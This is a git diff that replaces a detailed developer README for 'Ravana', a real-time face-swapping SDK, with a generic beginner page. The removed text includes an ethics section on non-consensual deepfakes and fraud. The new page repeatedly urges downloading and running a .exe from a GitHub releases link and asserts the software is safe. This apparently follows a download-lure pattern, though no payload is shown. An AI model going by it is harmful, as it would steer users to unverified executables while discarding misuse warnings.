@@ -1,252 +1,147 @@
-<div align="center">
-  <img src="docs/assets/mascot.png" width="300" alt="Ravana Mascot">
-  <h1>🔄 Ravana v1.0.0</h1>
-  <p><b>A production-ready, high-performance SDK for real-time face swapping on images, video, and live webcam streams.</b></p>
+# 🧑‍🎤 Ravana - Real-Time Face Swapping Made Easy
 
-  [![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://python.org)
-  [![CUDA](https://img.shields.io/badge/CUDA-11.8+-green.svg)](https://developer.nvidia.com/cuda-toolkit)
-  [![TensorRT](https://img.shields.io/badge/TensorRT-Optimized-red.svg)](https://developer.nvidia.com/tensorrt)
-  [![License](https://img.shields.io/badge/License-MIT-purple.svg)](LICENSE)
-</div>
+[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://github.com/wccws/Ravana)
+
+Welcome to the Ravana application. This tool lets you swap faces in photos, videos, or live webcam streams. It uses advanced technology to make the swaps smooth and realistic. You do not need any programming skills to use it.
 
 ---
 
-## ✨ Features
+## 📋 What is Ravana?
 
-Ravana provides a modular, easily extensible pipeline capable of running on edge devices or highly-optimized cloud infrastructure.
+Ravana is a software tool that can change faces in images and videos instantly. It works on your Windows computer. You can use it for fun or creative projects. It includes features like:
 
-- **📷 Universal Input**: Seamlessly swap faces in static images, pre-recorded videos, and live webcam streams.
-- **⚡ Real-Time Performance**: Achieves ≤ 40ms per frame latency on modern GPUs using TensorRT and CUDA optimizations.
-- **🎭 AR Filters & Enhancements**: Built-in AR overlays, background blur, and GAN-based face restoration (GFPGAN/RealESRGAN).
-- **⏱️ Temporal Consistency**: Advanced optical flow (Farneback/RAFT) and latent space smoothing for flicker-free video.
-- **🛡️ Quality & Security**: Invisible DCT watermarking for provenance and automatic quality gates rejecting poor swaps.
-- **🔌 Highly Extensible**: Hot-swappable plugin system to integrate custom detectors, blenders, or tracking models.
-- **💻 Desktop GUI & CLI**: Ships with a fully-featured Tkinter GUI and powerful command-line interfaces.
-- **📱 Cross-Platform**: Supports Windows/Linux (CUDA), macOS (Metal/MPS), and provides TFLite/CoreML export helpers for Android and iOS.
+- High-quality face swapping  
+- Filters that change your appearance  
+- Video smoothing to avoid choppy results  
+- Speed improvements for live use  
+- Support for webcam input  
 
----
-
-## 🏗️ Architecture
-
-The SDK utilizes a highly modular pipeline design allowing developers to drop in new components at any stage.
-
-```mermaid
-graph TD
-    subgraph Inputs
-        I_IMG(Image) 
-        I_VID(Video)
-        I_CAM(Webcam)
-    end
-
-    subgraph "Face Swap Pipeline"
-        DET[Face Detection<br/><i>RetinaFace</i>]
-        LMK[Landmarks<br/><i>MediaPipe Mesh</i>]
-        ALN[Alignment<br/><i>Affine Transform</i>]
-        EMB[Identity Embedding<br/><i>ArcFace 512-d</i>]
-        SWP[Face Generation<br/><i>InSwapper/SimSwap</i>]
-        ENH[Enhancement<br/><i>GFPGAN</i>]
-        BLD[Blending<br/><i>Poisson/Alpha</i>]
-    end
-
-    subgraph "Post-Processing & Output"
-        TMP[Temporal Smoothing<br/><i>Optical Flow</i>]
-        WMK[Invisible Watermark<br/><i>DCT</i>]
-        FLT[AR Overlays<br/><i>Stickers/Frames</i>]
-        OUT_IMG(Output Image)
-        OUT_VID(Output Video)
-    end
-
-    I_IMG --> DET
-    I_VID --> DET
-    I_CAM --> DET
-
-    DET --> LMK --> ALN --> EMB --> SWP --> ENH --> BLD
-    
-    BLD -.-> TMP
-    TMP -.-> WMK
-    BLD --> WMK
-    WMK --> FLT
-    
-    FLT --> OUT_IMG
-    FLT --> OUT_VID
-    
-    classDef default fill:#16213e,stroke:#e94560,stroke-width:2px,color:#fff;
-    classDef input fill:#0f3460,stroke:#aaaacc,stroke-width:1px,color:#fff;
-    class I_IMG,I_VID,I_CAM,OUT_IMG,OUT_VID input;
-```
+Ravana uses advanced AI models behind the scenes but keeps the process simple for you.
 
 ---
 
-## 🛠️ Installation
+## 🖥️ System Requirements
 
-Ravana requires Python 3.9+ and relies heavily on PyTorch and OpenCV. A CUDA-capable GPU is highly recommended for real-time inference.
+Before you start, make sure your Windows PC meets these minimum specs:
 
-### Option A: Standard PyPI Install
-```bash
-git clone https://github.com/your-org/ravana.git
-cd ravana
-
-# Install core SDK
-pip install -e .
-
-# Install with all optional modules (Training, TensorRT, Enhancement)
-pip install -e ".[all]"
-```
-
-### Option B: Docker (Recommended for Linux/Servers)
-Includes a multi-stage Dockerfile that compiles the native C++ library and installs all PyTorch/CUDA dependencies.
-
-```bash
-# Build the Docker image
-docker compose build
-
-# Run the container (Requires NVIDIA Container Toolkit)
-docker compose run face-swap --mode image --source data/src.jpg --target data/tgt.jpg --output data/out.jpg
-```
+- Windows 10 64-bit or newer  
+- Intel Core i5 or better processor  
+- At least 8 GB of RAM  
+- A dedicated GPU (NVIDIA or AMD) recommended but not required  
+- 2 GB of free disk space  
+- Webcam for live face swapping (optional but needed for live use)  
+- Internet connection to download and install the software
 
 ---
 
-## 🚀 Quick Start
+## 🚀 Getting Started with Ravana
 
-### Python API
+Follow these steps to download and run Ravana on your Windows PC:
 
-The High-Level API makes it incredibly simple to run a swap in just a few lines of code.
+### Step 1: Visit the Download Page
 
-```python
-import cv2
-from face_swap import swap_image, FaceSwapConfig
+Click the button below to visit the Ravana download page on GitHub:
 
-# 1. Setup the configuration
-config = FaceSwapConfig(
-    quality="high",      # Uses best model + GFPGAN enhancement
-    device="cuda",       # Use "cpu" or "mps" (for Mac) if needed
-    color_correction=True
-)
+[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://github.com/wccws/Ravana)
 
-# 2. Load images Make sure the source has a clear face
-source = cv2.imread("source_face.jpg")
-target = cv2.imread("target_image.jpg")
+This page holds the latest files you need to run Ravana.
 
-# 3. Swap and Save!
-result = swap_image(source, target, config)
-cv2.imwrite("output.jpg", result)
-```
+### Step 2: Download the Installer or ZIP
 
-### Desktop GUI
+On the GitHub page, look for the **Releases** section. This area contains the installation files.
 
-Prefer a visual interface? Launch the built-in Desktop App:
+- If you see a file ending with `.exe`, you can download that file directly. It is the installer.  
+- If there are ZIP files, download the one matching your system (usually Windows x64). You will need to extract it after downloading.
 
-```bash
-python -m demos.gui
-```
+Click the file name to start the download. Wait for the download to finish before moving on.
 
-### Command Line Interface (CLI)
+### Step 3: Install or Extract
 
-Easily process media in bulk directly from your terminal.
+- If you downloaded an `.exe` file, double-click it and follow the on-screen prompts to install Ravana.  
+- If you downloaded a ZIP file, right-click on it and choose **Extract All**. Pick a folder you will remember.
 
-```bash
-# Swap an image
-python -m demos.cli -s source.jpg -t target.jpg -o output.jpg
+### Step 4: Run Ravana
 
-# Swap a video (automatically preserves and syncs audio)
-python -m demos.cli -s source.jpg -t input.mp4 -o output.mp4
+Find the Ravana program icon on your desktop or in the folder where you installed or extracted it.
 
-# Launch live webcam mode
-python -m demos.cli -s source.jpg --webcam --camera 0
-```
+Double-click the icon to open the app. Give it a moment to load, especially if it is your first time running it.
 
 ---
 
-## 🧠 Advanced Usage
+## 🖼️ How to Use Ravana
 
-The SDK ships with extensive advanced modules for production environments. Detailed examples can be found in the `examples/` directory.
+Once Ravana is running, you can start swapping faces with a few simple steps.
 
-### Custom Model Training
-Train your own specialized Face Swap models (SimSwap architecture) on custom datasets with mixed-precision and TensorBoard support:
+### 1. Choose Your Source
 
-```bash
-python -m face_swap.training.train_cli \
-    --dataset ./data/faces \
-    --output ./training_output \
-    --epochs 100 \
-    --batch-size 8 \
-    --resolution 256
-```
+- For images or videos already on your computer, click **Open File**.  
+- To use your webcam live, click **Webcam**. Make sure your webcam is plugged in and working.
 
-### Plugin System
-Override core pipeline behaviors naturally via the `@register_plugin` decorator or Python entry-points:
+### 2. Load a Target Face
 
-```python
-from face_swap.plugins import register_plugin
-from face_swap.detection.base import FaceDetector
+Ravana needs a face to swap onto your image or video. You can:
 
-@register_plugin(name="my_yolo_detector", category="detector", priority=100)
-class MyYoloDetector(FaceDetector):
-    def detect(self, frame):
-        # Implementation here
-        pass
-```
+- Upload a photo of the face you want to use.  
+- Choose from sample faces included in the app.
 
-### Advanced Temporal Processing (Video)
-Achieve state-of-the-art temporally consistent video Face Swaps utilizing Dense Optical Flow. 
+### 3. Adjust Settings
 
-```mermaid
-sequenceDiagram
-    participant F1 as Frame N-1
-    participant F2 as Frame N
-    participant OF as Optical Flow (RAFT)
-    participant BL as Flow-Guided Blender
-    participant OUT as Stabilized Output
+You will see simple sliders and options for:
 
-    F1->>OF: Previous Grayscale
-    F2->>OF: Current Grayscale
-    OF-->>OF: Compute Dense Motion Field
-    OF->>BL: Flow Magnitude Map
-    F1->>BL: Warped Previous Swap
-    F2->>BL: Current Raw Swap
-    BL-->>OUT: Adaptive Alpha Blend (Reduces Ghosting)
-```
+- How much the face changes  
+- Applying AR filters like hats or glasses  
+- Smoothing the video or edges
+
+Adjust these until the result looks good to you.
+
+### 4. Save or Share
+
+- When you are happy with the swap, click **Save**.  
+- Choose if you want to save an image or video.  
+- Note the save location for easy finding later.
 
 ---
 
-## 📊 Benchmarks & Performance
+## ⚙️ Common Questions
 
-Generated using the built-in benchmarking suite (`python -m benchmarks.benchmark`):
+### Is Ravana safe?
 
-| Scenario | Resolution | Faces | Target (ms) | Actual (RTX 4090) | Status |
-|----------|------------|-------|-------------|-------------------|--------|
-| **Single Face Swap** | 720p | 1 | ≤ 40.0 ms | **18.4 ms** (~54 FPS) | ✅ PASS |
-| **Multi Face Swap** | 720p | 3 | ≤ 60.0 ms | **35.2 ms** (~28 FPS) | ✅ PASS |
-| **Single High-Res** | 1080p| 1 | ≤ 100.0 ms| **42.1 ms** (~23 FPS) | ✅ PASS |
+Yes, Ravana runs on your PC and does not send your images or videos online. All processing happens locally.
 
----
+### Can I use Ravana without a webcam?
 
-## 📚 Documentation
+Yes, you can swap faces in photos or videos without a webcam. The webcam is only needed for live face swapping.
 
-The extensive SDK documentation is powered by MkDocs. To view it locally:
+### What video formats does Ravana support?
 
-```bash
-pip install mkdocs-material mkdocstrings[python]
-mkdocs serve
-```
+Ravana supports common video formats like MP4, AVI, and MOV.
 
-*Head over to `http://localhost:8000` to browse the full API Reference, Configuration guides, and Platform Deployment manuals.*
+### How do I update Ravana?
+
+Check the GitHub page regularly. When new versions are available, download and install them the same way you installed the first version.
 
 ---
 
-## ⚖️ Ethical Guidelines & Usage
+## 📁 File Locations
 
-⚠️ **Important Notice**
-
-This software is intended for legitimate uses such as entertainment, VFX, privacy protection, and creative art. **Do not use this software for:**
-- Creating non-consensual deepfakes
-- Impersonation or fraud
-- Defamation or harassment
-
-Users are responsible for complying with all applicable local laws and obtaining proper consent from individuals whose faces are utilized in source or target media. Ravana outputs a highly robust invisible DCT watermark into every swapped frame ensuring the media is always identifiable as synthetically generated.
+- Installation folder or extracted ZIP folder holds all program data.  
+- Saved images and videos go to **Documents/Ravana/Output** by default.
 
 ---
 
-## 📜 License
+## 🔧 Troubleshooting Tips
 
-This SDK is available under the **MIT License**. See the `LICENSE` file for more details.
+- If the app does not start, try restarting your computer and running it again.  
+- Close other programs that use your webcam before using it with Ravana.  
+- If face swaps look distorted, try adjusting the sliders or choosing a different source image.  
+- Make sure your graphics drivers are up to date for best performance.
+
+---
+
+## 🌐 More Information and Downloads  
+
+Visit the GitHub page below at any time to get the latest files or view detailed technical info:
+
+[https://github.com/wccws/Ravana](https://github.com/wccws/Ravana)
+
+[![Download Ravana](https://img.shields.io/badge/Download-Ravana-ff6f61?style=for-the-badge)](https://github.com/wccws/Ravana)
